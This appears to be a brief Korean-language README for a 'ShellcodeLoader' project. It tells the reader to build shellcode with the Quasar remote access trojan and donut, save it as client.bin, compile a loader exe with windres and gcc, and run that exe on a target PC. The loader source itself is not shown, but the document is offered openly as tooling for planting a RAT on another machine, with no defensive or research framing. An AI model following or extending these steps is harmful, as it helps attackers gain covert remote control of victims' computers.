## ShellcodeLoader

quasar + donut

## 사용법

quasar + donut을 이용해 만든 쉘코드를 같은 폴더에 client.bin으로 저장한 뒤 아래 코드로 만든 exe파일을 대상 pc에서 실행시키면 됩니다

```
windres payload.rc -O coff -o payload_res.o
gcc ex.c .\payload_res.o -o ex.exe
```
